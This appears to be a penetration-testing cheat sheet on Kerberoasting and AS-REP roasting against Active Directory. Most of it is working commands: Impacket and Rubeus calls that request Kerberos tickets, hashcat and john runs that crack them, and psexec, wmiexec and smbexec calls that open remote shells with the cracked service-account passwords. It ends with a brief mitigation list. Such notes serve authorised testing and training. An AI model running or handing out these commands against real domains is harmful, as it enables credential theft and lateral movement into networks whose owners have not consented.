# Kerberoasting with Impacket

Extracting and cracking Kerberos service tickets to obtain service account credentials.

## Prerequisites

- Valid domain credentials (any domain user)
- Network access to the DC (port 88)

## Request TGS Tickets

```bash
# Using Impacket's GetUserSPNs
python3 GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request

# With hash instead of password
python3 GetUserSPNs.py domain.local/user -hashes :aadm3b... -dc-ip 10.10.10.10 -request

# Output to file
python3 GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request > hashes.txt
```

## Crack the Tickets

```bash
# hashcat mode 13100 (Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# john
john --format=krb5tgs --wordlist=rockyou.txt hashes.txt
```

## AS-REP Roasting (No Preauth)

```bash
# Users with "Do not require Kerberos preauthentication" set
python3 GetNPUsers.py domain.local/ -dc-ip 10.10.10.10 -usersfile users.txt

# With credentials
python3 GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.10 -request
```

## From Linux with Rubeus (via Wine or .NET)

```bash
# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe asreproast /outfile:asrep.txt
```

## Post-Cracking

```bash
# If you cracked a service account password, try to get a shell
python3 psexec.py domain.local/svc-sql:password@10.10.10.10
python3 wmiexec.py domain.local/svc-sql:password@10.10.10.10
python3 smbexec.py domain.local/svc-sql:password@10.10.10.10
```

## Mitigation

- Use Group Managed Service Accounts (gMSA) with automatic password rotation
- Set long, complex passwords (>25 chars) for service accounts
- Disable "Do not require Kerberos preauthentication"
- Monitor event ID 4769 (TGS request) for anomalous patterns
